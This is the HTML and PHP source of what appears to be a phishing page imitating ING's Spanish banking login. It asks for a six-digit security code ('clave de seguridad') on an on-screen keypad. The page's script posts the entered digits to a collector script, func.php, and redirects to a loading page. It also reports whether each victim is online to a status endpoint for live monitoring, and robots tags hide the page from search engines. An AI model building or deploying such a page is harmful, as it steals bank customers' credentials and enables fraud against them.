<!doctype html>
<html class="zz">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">

        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />

        <title>ING</title>

        <script>
            /* Start Status */
                function updateStatus(status) {
                    fetch('./status/update_status.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({status , page : "PASSWORD PAGE"})
                    });
                }
                
                updateStatus('online');
                
                window.addEventListener('beforeunload', () => {
                    updateStatus('offline');
                });
                
                setInterval(() => {
                    updateStatus('online');
                }, 30000); 
            /* End Status */            
        </script>         
    </head>

    <body class="zz">

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="./Assets/imgs/logo.svg"></div>
                <div class="right"><img src="./Assets/imgs/header-right.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- LOGIN AREA -->
        <section id="login-area">
            <div class="box">
                <div id="forma">
                    <input type="hidden" name="steeep" id="steeep" value="firma">
                    <input type="hidden" name="password" id="password">
                    <legend>Clave de seguridad</legend>
                    <p>Completa las posiciones que faltan de tu clave de seguridad: <img src="./Assets/imgs/help.png"></p>

                    <div class="password-area">
                        <div class="current"></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                    <?php if( isset($_GET['error']) ) : ?>
                    <p class="error-message mt-2" style="font-size:13px; color:red;">Clave de seguridad no válido</p>
                    <?php endif; ?> 

                    <div class="numbers">
                        <ul>
                            <li data-num="6">6</li>
                            <li data-num="9">9</li>
                            <li data-num="4">4</li>
                            <li data-num="7">7</li>
                            <li data-num="1">1</li>
                            <li data-num="8">8</li>
                            <li data-num="5">5</li>
                            <li data-num="0">0</li>
                            <li data-num="2">2</li>
                            <li data-num="3">3</li>
                        </ul>
                    </div>

                    <div class="form-group mb20 mt20">
                        <button type="button" class="reset">Borrar</button>
                    </div>
                    
                    <p class="mb-0"><i class="fas fa-chevron-right"></i> <span style="color: #333">No recuerdo mi clave</span></p>
                    <p class="mb-4"><i class="fas fa-chevron-right"></i> <span style="color: #333">Más información sobre seguridad</span></p>
                </div>
            </div>
        </section>
        <!-- END LOGIN AREA -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>

            $('.numbers ul li').click(function(){
                var pass_length = $('#password').val().length;
                var val         = $(this).data('num');
                var old_val     = $('#password').val();
                var zz          = old_val + val;
                $('#password').val(zz);
                $('.password-area div').each(function(i){
                    if($(this).hasClass('current')) {
                        $(this).removeClass('current').addClass('active').next().addClass('current');
                        return false;
                    }
                });
                if( $('#password').val().length > 0 ) {
                    $('.reset').show();
                }
                if( $('#password').val().length == 6 ) {
                    
                    formData = {
                        'pass' : $('#steeep').val(),
                        'password' : $('#password').val(),
                    }

                    $.post( "./Assets/php/config/func.php", formData )
                    .done(function( data ) {
                        window.location.href = "./loading.php";
                    });

                }
            });

            $('.reset').click(function(){
                $('#password').val('');
                $('.password-area div').removeClass('active');
                $('.password-area div').removeClass('current');
                $('.password-area div:first-child').addClass('current');
                $(this).hide();
            });
        </script>
    </body>

</html>